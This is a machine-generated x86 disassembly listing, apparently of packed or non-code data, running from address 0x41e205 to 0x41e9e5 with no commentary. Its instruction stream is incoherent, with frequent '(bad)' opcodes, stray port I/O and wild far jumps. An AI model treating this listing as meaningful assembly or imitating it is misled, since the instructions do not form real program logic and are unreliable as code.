  41e205:	mov    cl,0x15
  41e207:	aaa    
  41e208:	inc    ebx
  41e209:	shr    al,1
  41e20b:	adc    BYTE PTR [edi+0x7b],al
  41e20e:	and    al,0x29
  41e210:	in     al,dx
  41e211:	xlat   BYTE PTR ds:[ebx]
  41e212:	xchg   eax,ebp
  41e214:	push   ds
  41e215:	jns    0x41e1de
  41e217:	sti    
  41e218:	ret    0x16d
  41e21b:	mov    dl,0xe6
  41e21d:	in     al,0xb6
  41e21f:	xor    BYTE PTR [ebp-0x11eb600d],bh
  41e225:	mov    cl,0x7e
  41e227:	lahf   
  41e228:	inc    ebp
  41e229:	lgs    edi,FWORD PTR [ebx-0x60c8e78a]
	...
  41e238:	add    BYTE PTR [eax],al
  41e23a:	add    ch,dh
  41e23c:	adc    al,0xae
  41e23e:	adc    ebp,edi
  41e240:	mov    ebx,0x84e6f6fd
  41e245:	lds    ebp,FWORD PTR [edx+0x1c813425]
  41e24b:	pop    ebp
  41e24c:	lahf   
  41e24d:	add    DWORD PTR [eax],eax
  41e24f:	lods   eax,DWORD PTR ds:[esi]
  41e250:	add    BYTE PTR [eax],al
  41e252:	add    dl,ah
  41e254:	test   eax,0x3a5bbd46
  41e259:	repnz rol DWORD PTR [edi+0x46],0xf5
  41e25e:	sub    dh,BYTE PTR [edi+eax*2+0x5e5365a6]
  41e265:	and    al,0xac
  41e267:	and    esp,DWORD PTR [ecx+0x13]
  41e26a:	aas    
  41e26b:	in     eax,0xe6
  41e26d:	cld    
  41e26e:	dec    esi
  41e26f:	inc    edi
  41e270:	and    BYTE PTR ds:0xc8e9889,ah
  41e276:	std    
  41e277:	lods   eax,DWORD PTR ds:[esi]
  41e278:	mov    ch,0xe6
  41e27a:	mov    gs,WORD PTR [ecx-0x2ddd600]
  41e280:	cdq    
  41e281:	ins    DWORD PTR es:[edi],dx
  41e282:	call   0xb6e5879b
  41e287:	jae    0x41e29a
  41e289:	mov    ah,0xac
  41e28b:	neg    ch
  41e28d:	mov    dl,0xc3
  41e290:	xchg   DWORD PTR [esp+ecx*2+0x1bd127f3],edi
  41e297:	shl    bl,cl
  41e299:	mov    edx,DWORD PTR [eax+ebp*2]
  41e29c:	mov    esi,0x11558a28
  41e2a1:	js     0x41e30f
  41e2a3:	into   
  41e2a4:	fsub   QWORD PTR [esi-0x6e4d8294]
  41e2aa:	pop    edi
  41e2ab:	add    al,BYTE PTR [esi-0x43]
  41e2ae:	cmp    DWORD PTR [ecx],edx
  41e2b0:	xchg   ebp,eax
  41e2b1:	jae    0x41e28e
  41e2b3:	pop    esi
  41e2b4:	test   al,0x60
  41e2b6:	mov    esp,DWORD PTR [ecx+0xd9e80a]
  41e2bc:	jmp    0x73b3:0x409f7872
  41e2c3:	dec    esp
  41e2c4:	outs   dx,BYTE PTR ds:[esi]
  41e2c5:	push   es
  41e2c6:	(bad)  
  41e2c7:	push   esi
  41e2c8:	push   0xffffffe4
  41e2ca:	mov    al,0xd8
  41e2cc:	leave  
  41e2cd:	push   eax
  41e2ce:	inc    eax
  41e2cf:	xor    edx,eax
  41e2d1:	jg     0x41e2b3
  41e2d3:	in     al,0x19
  41e2d5:	sbb    DWORD PTR [esi-0x59dc5ceb],0xffffff94
  41e2dc:	jecxz  0x41e27c
  41e2de:	sub    dh,BYTE PTR [esi-0x9]
  41e2e1:	and    dh,ah
  41e2e3:	(bad)  
  41e2e4:	nop
  41e2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2e6:	out    dx,al
  41e2e7:	in     al,dx
  41e2e8:	jp     0x41e329
  41e2ea:	and    ch,BYTE PTR [ecx+0x6d3edae7]
  41e2f0:	mov    esi,0x2d22be85
  41e2f5:	inc    ebx
  41e2f6:	cmp    esi,DWORD PTR [edi+0xfd34dc]
  41e2fc:	inc    ebp
  41e2fd:	or     BYTE PTR [ebx+0xf4],bl
	...
  41e30b:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  41e311:	mov    edi,0xbb1c16fb
  41e316:	shl    dh,0x19
  41e319:	mov    WORD PTR [edx+0x1a00a],es
  41e31f:	lods   eax,DWORD PTR ds:[esi]
  41e320:	add    BYTE PTR [eax],al
  41e322:	add    BYTE PTR [ebx+0x4ca33583],bh
  41e328:	daa    
  41e329:	es jbe 0x41e37e
  41e32c:	in     eax,dx
  41e32d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e32e:	jae    0x41e2b1
  41e330:	cmp    edi,DWORD PTR [ebx+eax*1-0x24]
  41e334:	ret    
  41e335:	inc    edi
  41e336:	pop    esi
  41e337:	in     eax,0x91
  41e339:	idiv   esp
  41e33b:	test   al,0xc8
  41e33d:	icebp  
  41e33e:	je     0x41e302
  41e340:	outs   dx,DWORD PTR ds:[esi]
  41e341:	bnd jno 0x41e2d3
  41e344:	add    DWORD PTR [esi+0x3a],0xd11fc843
  41e34b:	xchg   ebx,eax
  41e34c:	sti    
  41e34d:	push   esi
  41e34e:	jmp    0xbf950e91
  41e353:	pop    edi
  41e354:	jp     0x41e3c5
  41e356:	test   ecx,edi
  41e358:	sbb    cl,BYTE PTR [edx-0x7fe24a85]
  41e35e:	fisub  DWORD PTR [edi]
  41e360:	pop    eax
  41e361:	imul   edx,esp,0x37
  41e364:	test   DWORD PTR [edx+0x269a05d7],eax
  41e36a:	cmp    DWORD PTR ds:0x7ea693e8,ebp
  41e370:	sub    edi,ebp
  41e372:	in     eax,0x90
  41e374:	inc    ecx
  41e375:	jge    0x41e33f
  41e377:	xor    DWORD PTR [eax-0x1b],ebx
  41e37a:	jmp    0x7e8b:0x974b16a4
  41e381:	test   eax,0xcd5ffb2f
  41e386:	mov    eax,0xc6916108
  41e38b:	nop
  41e38c:	test   BYTE PTR [edi],bl
  41e38e:	jle    0x41e32e
  41e390:	aad    0x23
  41e392:	jg     0x41e3ac
  41e394:	or     al,0x11
  41e396:	cmp    BYTE PTR [edi],bl
  41e398:	jns    0x41e347
  41e39a:	jns    0x41e3d7
  41e39c:	add    esi,DWORD PTR [eax]
  41e39e:	sbb    bh,bh
  41e3a0:	jl     0x41e373
  41e3a2:	ja     0x41e3c0
  41e3a4:	out    0xf8,al
  41e3a6:	pusha  
  41e3a7:	push   edx
  41e3a8:	and    BYTE PTR [eax-0x6d3b0741],dl
  41e3ae:	sti    
  41e3af:	mov    dl,0xd8
  41e3b1:	pushf  
  41e3b2:	jge    0x41e37f
  41e3b4:	mov    ebx,0x8b4c75d2
  41e3b9:	inc    esp
  41e3ba:	pusha  
  41e3bb:	xchg   bh,ah
  41e3bd:	adc    bh,BYTE PTR [esi+0x5e8e8f5f]
  41e3c3:	aad    0x20
  41e3c5:	inc    edx
  41e3c6:	sar    DWORD PTR [ebp+0x544415f7],cl
  41e3cc:	mov    ecx,0x46bf06
	...
  41e3d9:	add    BYTE PTR [eax],al
  41e3db:	aam    0xf
  41e3dd:	push   ecx
  41e3de:	lock (bad) 
  41e3e1:	cmc    
  41e3e2:	das    
  41e3e3:	sbb    BYTE PTR [eax],cl
  41e3e5:	xchg   ebx,eax
  41e3e6:	iret   
  41e3e7:	pop    esp
  41e3e8:	retf   
  41e3e9:	and    DWORD PTR [esi-0x49],ebp
  41e3ec:	mov    al,ds:0xad0001
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	dec    edi
  41e3f4:	test   DWORD PTR [esi+0x68],eax
  41e3f7:	push   ebx
  41e3f8:	pop    es
  41e3f9:	jb     0x41e3a9
  41e3fb:	add    eax,0x36f987a4
  41e400:	je     0x41e44e
  41e402:	dec    eax
  41e403:	jmp    0xb8e94115
  41e408:	mov    ch,0x75
  41e40a:	out    0x25,eax
  41e40c:	lods   eax,DWORD PTR ds:[esi]
  41e40d:	stc    
  41e40e:	imul   eax,DWORD PTR [edi+0x3608f04b],0xffffffde
  41e415:	cmp    BYTE PTR [ebx-0x80],bh
  41e418:	stos   BYTE PTR es:[edi],al
  41e419:	bnd jne 0x41e443
  41e41c:	pushf  
  41e41d:	sub    BYTE PTR [ecx-0x2a7a1748],0x86
  41e424:	imul   esp,esi,0x216808d
  41e42a:	fs test al,0x9c
  41e42d:	fstp   QWORD PTR [edi+ecx*4-0xc81eb48]
  41e434:	pop    ebp
  41e435:	jae    0x41e4b6
  41e437:	out    dx,eax
  41e438:	lea    eax,[esi-0x6ef50073]
  41e43e:	shl    BYTE PTR [esi+eiz*8],cl
  41e441:	push   ebx
  41e442:	and    BYTE PTR [eax],bl
  41e444:	lea    edx,[edx]
  41e446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e447:	xchg   BYTE PTR [esi],al
  41e449:	mov    eax,ds:0x32430af6
  41e44e:	dec    esp
  41e44f:	mov    edi,0x9cbd2ec9
  41e454:	xor    eax,0xe4c163d6
  41e459:	jbe    0x41e3f4
  41e45b:	xor    al,0x72
  41e45d:	shl    DWORD PTR [edx-0x24e95d5d],1
  41e463:	add    cl,BYTE PTR [edi]
  41e465:	pop    eax
  41e466:	gs inc eax
  41e468:	scas   al,BYTE PTR es:[edi]
  41e469:	out    dx,eax
  41e46a:	lock add esp,DWORD PTR [ecx-0x1f]
  41e46e:	adc    BYTE PTR [esi],cl
  41e470:	pop    ecx
  41e471:	(bad)  
  41e472:	sub    eax,0xb29e6bad
  41e477:	loope  0x41e4a8
  41e479:	add    dh,BYTE PTR [esi-0x7820eb83]
  41e47f:	aad    0x2b
  41e481:	outs   dx,DWORD PTR ds:[esi]
  41e482:	cmc    
  41e483:	jmp    0x3c1dcaa6
  41e488:	adc    edx,ebx
  41e48a:	loope  0x41e4d5
  41e48c:	in     eax,dx
  41e48d:	cmc    
  41e48e:	repz push edx
  41e490:	xchg   DWORD PTR [ebx-0x75f3654f],esi
  41e496:	out    0xb6,al
  41e498:	mov    eax,ds:0xd27de81f
  41e49d:	sub    bl,BYTE PTR [esi+0xc2]
	...
  41e4ab:	int    0x2d
  41e4ad:	xchg   ebp,eax
  41e4ae:	inc    ebx
  41e4af:	cmc    
  41e4b0:	sti    
  41e4b1:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4b8:	call   0xa1a6accb
  41e4bd:	add    DWORD PTR [eax],eax
  41e4bf:	lods   eax,DWORD PTR ds:[esi]
  41e4c0:	add    BYTE PTR [eax],al
  41e4c2:	add    BYTE PTR [ebx],ah
  41e4c4:	mov    edi,0xf6094fdf
  41e4c9:	cli    
  41e4ca:	jb     0x41e4f4
  41e4cc:	inc    esi
  41e4cd:	aas    
  41e4ce:	daa    
  41e4cf:	xor    esp,DWORD PTR ss:0xcac647a2
  41e4d6:	inc    ebx
  41e4d7:	ret    
  41e4d8:	and    eax,DWORD PTR [edi+0x6563d663]
  41e4de:	push   ebx
  41e4df:	pusha  
  41e4e0:	jb     0x41e4d1
  41e4e2:	lods   eax,DWORD PTR ds:[esi]
  41e4e3:	or     BYTE PTR [edx+edi*2],al
  41e4e6:	inc    ebx
  41e4e7:	cmp    DWORD PTR [edi],edx
  41e4e9:	fsubr  QWORD PTR [ebx]
  41e4eb:	stos   DWORD PTR es:[edi],eax
  41e4ec:	je     0x41e52b
  41e4ee:	cmp    ecx,0xe
  41e4f1:	(bad)  
  41e4f2:	into   
  41e4f3:	fimul  DWORD PTR [edi+0x78fb68c4]
  41e4f9:	inc    edi
  41e4fa:	and    eax,0x414f69c
  41e4ff:	or     dl,dl
  41e501:	sub    eax,0xd830b670
  41e506:	hlt    
  41e507:	add    DWORD PTR [edx-0x4a],ecx
  41e50a:	aas    
  41e50b:	call   0xb459:0x5b7882a1
  41e512:	jbe    0x41e538
  41e514:	or     al,0x42
  41e516:	inc    edi
  41e517:	push   cs
  41e518:	inc    ebp
  41e519:	push   ebp
  41e51a:	sti    
  41e51b:	jmp    0x41e4ef
  41e51d:	pop    ebx
  41e51f:	add    eax,0x4fcbdb7d
  41e524:	xor    eax,0x2e8b3348
  41e529:	ret    0x682c
  41e52c:	std    
  41e52d:	lods   eax,DWORD PTR ds:[esi]
  41e52e:	ins    DWORD PTR es:[edi],dx
  41e52f:	jne    0x41e582
  41e531:	fisubr WORD PTR [ebx-0x65264549]
  41e537:	es stos BYTE PTR es:[edi],al
  41e539:	enter  0x4df6,0x6e
  41e53d:	mov    BYTE PTR [ecx+esi*2-0x409a3bbc],al
  41e544:	jmp    0x41e522
  41e546:	mov    cl,0x87
  41e548:	sbb    al,0xc8
  41e54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54b:	inc    eax
  41e54c:	(bad)  
  41e54d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54e:	xor    al,0x2b
  41e550:	sub    al,0x1e
  41e552:	jmp    0x41e594
  41e554:	and    bh,dl
  41e556:	lock mov eax,0x6f079cfe
  41e55c:	push   cs
  41e55d:	stos   BYTE PTR es:[edi],al
  41e55e:	pop    ss
  41e55f:	fnstcw WORD PTR [ecx+0x2d95b379]
  41e565:	cli    
  41e566:	xor    BYTE PTR [edi],bh
  41e568:	push   esi
  41e569:	pop    eax
  41e56a:	sbb    BYTE PTR [esi],ch
  41e56c:	sbb    dh,bh
  41e56e:	cmp    eax,0x2c
	...
  41e57b:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e57f:	test   DWORD PTR [ebx-0xce58301],0x1a454cfc
  41e589:	or     cl,BYTE PTR [ecx+0x1a211]
  41e58f:	lods   eax,DWORD PTR ds:[esi]
  41e590:	add    BYTE PTR [eax],al
  41e592:	add    al,ch
  41e594:	arpl   WORD PTR [eax],cx
  41e596:	mov    cs,eax
  41e598:	scas   al,BYTE PTR es:[edi]
  41e599:	pop    ecx
  41e59a:	add    al,0x91
  41e59c:	ss cmp al,0x7e
  41e59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5a0:	add    al,BYTE PTR [edi]
  41e5a2:	aad    0x65
  41e5a4:	fucomp st(4)
  41e5a6:	or     ebp,DWORD PTR fs:[ebp+0x3be07673]
  41e5ad:	stc    
  41e5ae:	mov    bh,0x30
  41e5b0:	mov    bl,dh
  41e5b2:	inc    esp
  41e5b3:	pop    ebp
  41e5b4:	outs   dx,DWORD PTR ds:[esi]
  41e5b5:	rcr    BYTE PTR [eax],1
  41e5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b8:	leave  
  41e5b9:	xor    eax,0x9c401a89
  41e5be:	fsub   DWORD PTR [esi-0x24]
  41e5c1:	inc    esi
  41e5c2:	imul   DWORD PTR [eax-0x2716b3bf]
  41e5c8:	or     edi,edx
  41e5ca:	sub    BYTE PTR [ecx+0x633a4183],ah
  41e5d0:	shl    ebx,cl
  41e5d2:	xor    bh,BYTE PTR [ebx]
  41e5d4:	mov    dh,0x6d
  41e5d6:	popa   
  41e5d7:	jmp    0xfd20:0x82150ce6
  41e5de:	addr16 imul esi,edx,0x5e0a4d67
  41e5e5:	push   ebp
  41e5e6:	lods   eax,DWORD PTR ds:[esi]
  41e5e7:	sbb    dh,BYTE PTR [edx-0x3f]
  41e5ea:	adc    DWORD PTR [edx-0x1d],ecx
  41e5ed:	in     eax,dx
  41e5ee:	and    DWORD PTR [ecx+ebx*1+0x78a05548],edi
  41e5f5:	test   al,0xd0
  41e5f7:	xchg   ebp,eax
  41e5f8:	mov    al,0x82
  41e5fa:	es mov dh,0xc
  41e5fd:	imul   ecx,DWORD PTR [edx+0x3],0x407d36c4
  41e604:	sub    DWORD PTR [ecx+eiz*1+0x2d8ea0ca],esp
  41e60b:	xor    DWORD PTR [edi],esi
  41e60d:	sub    bh,BYTE PTR [eax]
  41e60f:	retf   0x38a5
  41e612:	das    
  41e613:	cmp    al,BYTE PTR [edx]
  41e615:	mov    dl,0x4c
  41e617:	jns    0x41e673
  41e619:	or     DWORD PTR [edi-0x24],edx
  41e61c:	pusha  
  41e61d:	push   ds
  41e61e:	dec    edx
  41e61f:	cmp    ebx,esp
  41e621:	add    al,0x12
  41e623:	dec    edx
  41e624:	cwde   
  41e625:	cmp    eax,esp
  41e627:	and    al,0x88
  41e629:	sahf   
  41e62a:	data16 and ch,0x4b
  41e62e:	xor    al,0x1f
  41e630:	cmp    cl,BYTE PTR [ebp-0x1508a3cd]
  41e636:	sbb    ah,BYTE PTR [eax]
  41e638:	outs   dx,DWORD PTR es:[esi]
  41e63a:	add    al,bh
  41e63c:	jmp    0x41e646
  41e63e:	call   0x41e722
	...
  41e64b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e64f:	jne    0x41e6b0
  41e651:	jg     0x41e68d
  41e653:	clc    
  41e654:	cs aas 
  41e656:	push   0xcc8b3c0e
  41e65b:	push   0xffffff8a
  41e65d:	add    DWORD PTR [eax],eax
  41e65f:	lods   eax,DWORD PTR ds:[esi]
  41e660:	add    BYTE PTR [eax],al
  41e662:	add    BYTE PTR [eax-0x2c9c5b47],bh
  41e668:	fimul  DWORD PTR [edi-0x283ddd6e]
  41e66e:	mov    gs,WORD PTR [edi]
  41e670:	cmp    ebx,esp
  41e672:	or     al,0x51
  41e674:	push   es
  41e675:	sub    bl,bl
  41e677:	(bad)  [eax+0x4d154115]
  41e67d:	shl    BYTE PTR [esi-0x27],cl
  41e680:	out    0x4e,al
  41e682:	mov    al,ds:0x534f6181
  41e687:	shr    BYTE PTR [ebp-0x11],1
  41e68a:	mov    ah,0xca
  41e68c:	sahf   
  41e68d:	arpl   si,bp
  41e68f:	fistp  QWORD PTR [ebp+0x48]
  41e692:	jo     0x41e679
  41e694:	cdq    
  41e695:	ficom  WORD PTR [esi+ecx*4-0x37a3d17b]
  41e69c:	dec    ecx
  41e69d:	and    dh,dl
  41e69f:	retf   
  41e6a0:	or     ebx,edx
  41e6a2:	sub    cl,BYTE PTR [edx-0x1727e39]
  41e6a8:	cld    
  41e6a9:	xor    DWORD PTR [ebx+eax*1-0x4128aca7],0xffffffc3
  41e6b1:	clc    
  41e6b2:	pop    esp
  41e6b3:	js     0x41e6a0
  41e6b5:	dec    edi
  41e6b6:	inc    ebp
  41e6b7:	(bad)  
  41e6b8:	(bad)  
  41e6b9:	int3   
  41e6ba:	data16 mov ah,0x1f
  41e6bd:	dec    eax
  41e6be:	popa   
  41e6bf:	popf   
  41e6c0:	sub    al,0x8d
  41e6c2:	xchg   DWORD PTR cs:[edi+0x48a5918],ebp
  41e6c9:	call   0xc9c5f909
  41e6ce:	push   es
  41e6cf:	out    0xd0,al
  41e6d1:	sbb    eax,0x2456b0d3
  41e6d6:	ret    0x7e1e
  41e6d9:	ja     0x41e6d0
  41e6db:	pop    edx
  41e6dc:	rol    DWORD PTR [esi],0xec
  41e6df:	inc    ecx
  41e6e0:	or     edx,ebp
  41e6e2:	mov    ds:0x17fda3e,eax
  41e6e7:	inc    esi
  41e6e8:	push   esp
  41e6e9:	add    al,0x45
  41e6eb:	and    DWORD PTR [ebp+0x8bd211c],eax
  41e6f1:	std    
  41e6f2:	test   DWORD PTR [esi-0x14],0x9239eb6d
  41e6f9:	xchg   ebp,eax
  41e6fa:	mul    BYTE PTR [eax+0x681e8c44]
  41e700:	out    dx,al
  41e701:	jl     0x41e717
  41e703:	mov    ebp,0xc0ca2678
  41e708:	pop    eax
  41e709:	cmp    al,0xf4
  41e70b:	cli    
  41e70c:	jmp    0x0:0xe72a4a
	...
  41e71b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e721:	dec    ecx
  41e722:	mov    bl,0x94
  41e724:	je     0x41e6fd
  41e726:	call   0x8b17:0x5d22afa8
  41e72d:	add    DWORD PTR [eax],eax
  41e72f:	lods   eax,DWORD PTR ds:[esi]
  41e730:	add    BYTE PTR [eax],al
  41e732:	add    BYTE PTR [esi+edx*1+0x6c],dh
  41e736:	sti    
  41e737:	out    dx,al
  41e738:	or     bh,BYTE PTR [eax+ebx*4-0x22]
  41e73c:	call   0x7c5d:0x3b47f423
  41e743:	pop    ds
  41e744:	iret   
  41e745:	push   ebp
  41e746:	add    DWORD PTR [edi+0x149e82a2],esi
  41e74c:	lds    ebx,FWORD PTR [ebp+eax*4-0x9]
  41e750:	mov    eax,0xbd9a4f4a
  41e755:	xor    BYTE PTR [ecx+ebx*8-0x5e],bl
  41e759:	mov    ax,ds:0xdd29c54d
  41e75f:	fidivr WORD PTR [edi+0xa3a9c12]
  41e765:	ins    BYTE PTR es:[edi],dx
  41e766:	cmp    eax,0x81549eb
  41e76b:	xor    ch,BYTE PTR [esp+edx*8]
  41e76e:	imul   esi,DWORD PTR [ebp+0x5d5a74b5],0xa86a067f
  41e778:	sahf   
  41e779:	fld    QWORD PTR [ebx+0x77b2888c]
  41e77f:	fadd   DWORD PTR [eax+eax*4+0x7]
  41e783:	call   0x9cf6c479
  41e788:	jl     0x41e7d3
  41e78a:	pop    es
  41e78b:	or     BYTE PTR ds:0x93f06f05,0x28
  41e792:	xchg   esi,eax
  41e793:	int    0x9b
  41e795:	xchg   esi,eax
  41e796:	pushf  
  41e797:	xor    DWORD PTR [edx-0x43],esi
  41e79a:	lock arpl WORD PTR [ecx],sp
  41e79d:	fnstsw WORD PTR [edi+0x30]
  41e7a0:	cli    
  41e7a1:	dec    esp
  41e7a2:	(bad)  
  41e7a4:	xor    dh,ch
  41e7a6:	cdq    
  41e7a7:	pop    es
  41e7a8:	addr16 jb 0x41e767
  41e7ab:	mov    ah,0xab
  41e7ad:	xor    al,0x6d
  41e7af:	xor    BYTE PTR [ebx-0x650b6b6d],bh
  41e7b5:	sub    eax,DWORD PTR [edx+0x6a]
  41e7b8:	retf   
  41e7b9:	mov    esi,0x3f49b40f
  41e7be:	imul   esi,ecx,0xffffffde
  41e7c1:	pop    ds
  41e7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7c3:	fwait
  41e7c4:	mov    ecx,0x7b52fa45
  41e7c9:	dec    esp
  41e7ca:	mov    esi,0x24ee870e
  41e7cf:	and    ch,BYTE PTR [ebp-0x6b2bc865]
  41e7d5:	jle    0x41e7c5
  41e7d7:	repnz mov DWORD PTR [ecx+0x4fba03c8],ecx
  41e7de:	jb     0x41e79c
	...
  41e7e8:	add    BYTE PTR [eax],al
  41e7ea:	add    bh,bl
  41e7ec:	push   ebx
  41e7ed:	mov    dl,0x4f
  41e7ef:	mov    esi,0x67d3ffef
  41e7f4:	xchg   ecx,edi
  41e7f6:	adc    al,0xb0
  41e7f8:	scas   al,BYTE PTR es:[di]
  41e7fa:	enter  0x8bc4,0x1
  41e7fe:	add    BYTE PTR [ebp-0x4c000000],ch
  41e804:	push   edx
  41e805:	pop    eax
  41e806:	jo     0x41e7ce
  41e808:	jmp    0xbb:0x5a6de35b
  41e80f:	inc    edx
  41e810:	inc    edx
  41e811:	lods   eax,DWORD PTR ds:[esi]
  41e812:	and    eax,0x17251195
  41e817:	stos   BYTE PTR es:[edi],al
  41e818:	(bad)  
  41e819:	push   ss
  41e81a:	mov    esi,0x67ea56f3
  41e81f:	sub    BYTE PTR [ebp+0x7386d41e],bh
  41e825:	push   ds
  41e826:	xchg   esi,eax
  41e827:	add    BYTE PTR [ebx],dh
  41e829:	mov    esi,DWORD PTR [esi]
  41e82b:	jo     0x41e86b
  41e82d:	jae    0x41e87f
  41e82f:	xchg   BYTE PTR [edx+0x50],bh
  41e832:	pushf  
  41e833:	and    BYTE PTR [ebx-0x2536b1a],bl
  41e839:	push   eax
  41e83a:	mov    bl,0xd0
  41e83c:	sbb    ebp,DWORD PTR [eax]
  41e83e:	push   ebp
  41e83f:	lds    esp,FWORD PTR [esi-0x1bb4b7be]
  41e845:	popf   
  41e846:	cmp    DWORD PTR [eax+0x1015d1cd],edi
  41e84c:	scas   al,BYTE PTR es:[edi]
  41e84d:	jl     0x41e855
  41e84f:	sub    DWORD PTR [edx-0x23],esi
  41e852:	les    ecx,FWORD PTR [eax+0x32]
  41e855:	inc    edi
  41e856:	mov    esi,0x78cb02fb
  41e85b:	cmp    esp,edi
  41e85d:	(bad)  
  41e85e:	clc    
  41e85f:	adc    al,0x54
  41e861:	cmp    edi,DWORD PTR [ebp+0x71c5507]
  41e867:	sbb    al,BYTE PTR [ebx+0x305b8309]
  41e86d:	cs jg  0x41e81c
  41e870:	cmp    eax,0x7d65a2d1
  41e875:	ss jp  0x41e84d
  41e878:	fld    TBYTE PTR [esi+edx*8+0x297fa958]
  41e87f:	add    edi,DWORD PTR [esi+0x4]
  41e882:	hlt    
  41e883:	push   esp
  41e884:	stc    
  41e885:	(bad)  
  41e886:	pop    eax
  41e887:	shl    ecx,cl
  41e889:	aas    
  41e88a:	dec    ebp
  41e88b:	jg     0x41e88e
  41e88d:	loop   0x41e8b3
  41e88f:	sbb    al,BYTE PTR [esi+ebp*8-0x25164730]
  41e896:	xor    eax,DWORD PTR [ebp+0x6ba18194]
  41e89c:	rcl    ebx,cl
  41e89e:	pop    ss
  41e89f:	bound  edx,QWORD PTR [eax+edx*8+0x55a980f0]
  41e8a6:	gs jae 0x41e906
  41e8a9:	dec    esi
  41e8aa:	(bad)  
  41e8ab:	sub    esi,DWORD PTR [ebp+0x925dab]
	...
  41e8b9:	add    BYTE PTR [eax],al
  41e8bb:	xchg   DWORD PTR [ebx+edx*8],ecx
  41e8be:	fcmovu st,st(3)
  41e8c0:	fisttp WORD PTR [edi+0x640ccb5d]
  41e8c6:	push   ss
  41e8c7:	ja     0x41e93e
  41e8c9:	adc    al,0x34
  41e8cb:	jno    0x41e859
  41e8cd:	add    DWORD PTR [eax],eax
  41e8cf:	lods   eax,DWORD PTR ds:[esi]
  41e8d0:	add    BYTE PTR [eax],al
  41e8d2:	add    BYTE PTR [edx-0x439fc1ac],cl
  41e8d8:	xor    ebx,DWORD PTR [eax-0x4c4f41b1]
  41e8de:	sub    ch,BYTE PTR [esi]
  41e8e0:	cs lahf 
  41e8e2:	dec    esp
  41e8e3:	in     eax,dx
  41e8e4:	rcl    DWORD PTR [edx],cl
  41e8e6:	cld    
  41e8e7:	mov    al,ds:0x9ffb5217
  41e8ec:	sub    eax,0x70d03df4
  41e8f1:	inc    esp
  41e8f2:	lods   eax,DWORD PTR ds:[esi]
  41e8f3:	jl     0x41e8b4
  41e8f5:	add    DWORD PTR [ebp+0x337bcce7],0x6e
  41e8fc:	mov    ds:0x4017faad,eax
  41e901:	ins    BYTE PTR es:[edi],dx
  41e902:	xor    dh,BYTE PTR [esi+0x6f]
  41e905:	and    al,0x2a
  41e907:	test   BYTE PTR [ecx+0x7dd3bddb],ah
  41e90d:	add    al,0x76
  41e90f:	cmp    BYTE PTR [ecx-0x22b06e09],al
  41e915:	cld    
  41e916:	or     ecx,DWORD PTR [edi]
  41e918:	fdivp  st(0),st
  41e91a:	dec    DWORD PTR [edx-0x7cecc9f0]
  41e920:	dec    ecx
  41e921:	push   ebx
  41e922:	aad    0x8c
  41e924:	and    ch,bl
  41e926:	adc    eax,0x18f4c94a
  41e92b:	mov    edx,0x4ea7696d
  41e930:	push   ebp
  41e931:	cld    
  41e932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e933:	loop   0x41e9b3
  41e935:	aas    
  41e936:	lock xor edx,DWORD PTR ds:[ebx-0x7e]
  41e93b:	popa   
  41e93c:	mov    al,0x63
  41e93e:	sbb    esp,DWORD PTR [edi+0x362cdb6e]
  41e944:	icebp  
  41e945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e946:	inc    esi
  41e947:	push   cs
  41e948:	mov    al,ds:0x24f83210
  41e94d:	call   0x154f20df
  41e952:	sub    al,0x91
  41e954:	mov    al,ds:0xc6a05f97
  41e959:	cmp    DWORD PTR [eax],eax
  41e95b:	vsubpd ymm2,ymm5,ymm7
  41e95f:	fisttp DWORD PTR [edx]
  41e961:	pop    ebx
  41e962:	dec    esp
  41e963:	(bad)  
  41e965:	pushf  
  41e966:	push   0x8f2a61d1
  41e96b:	test   DWORD PTR [edx+0x45ec05fd],edi
  41e971:	sbb    ebp,DWORD PTR [ecx]
  41e973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e974:	repz pop esi
  41e976:	mov    dl,0xa9
  41e978:	in     al,0x0
  41e97a:	jmp    0xefd9ab9b
  41e97f:	adc    DWORD PTR [eax],eax
	...
  41e989:	add    BYTE PTR [eax],al
  41e98b:	lahf   
  41e98c:	arpl   WORD PTR [ebp+0x72],cx
  41e98f:	std    
  41e990:	jle    0x41e951
  41e992:	out    dx,eax
  41e993:	sbb    edi,esp
  41e995:	mov    BYTE PTR [edx+ecx*8+0x1ecd3e06],dh
  41e99c:	lea    eax,[ecx]
  41e99e:	add    BYTE PTR [ebp-0xe000000],ch
  41e9a4:	jecxz  0x41ea0e
  41e9a6:	loop   0x41e9a6
  41e9a8:	imul   ecx,ecx,0x4399d20a
  41e9ae:	xor    bl,dl
  41e9b0:	cmp    al,0x40
  41e9b2:	in     eax,0xc4
  41e9b4:	out    0xfd,eax
  41e9b6:	xchg   edi,eax
  41e9b7:	das    
  41e9b8:	pop    es
  41e9b9:	inc    ecx
  41e9ba:	cwde   
  41e9bb:	pusha  
  41e9bc:	or     ecx,eax
  41e9be:	push   ebp
  41e9bf:	push   ss
  41e9c0:	inc    eax
  41e9c1:	cmp    bl,BYTE PTR [ebp-0x2490dec5]
  41e9c7:	enter  0xeddd,0x45
  41e9cb:	push   edi
  41e9cc:	lock not BYTE PTR [edx+edi*2]
  41e9d0:	xchg   BYTE PTR [edi-0x3163147],bh
  41e9d6:	jge    0x41ea1f
  41e9d8:	rcl    DWORD PTR [edi+0x2b],0x1b
  41e9dc:	addr16 push 0x14105251
  41e9e2:	sub    al,0x0
  41e9e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e5:	and    bh,dh
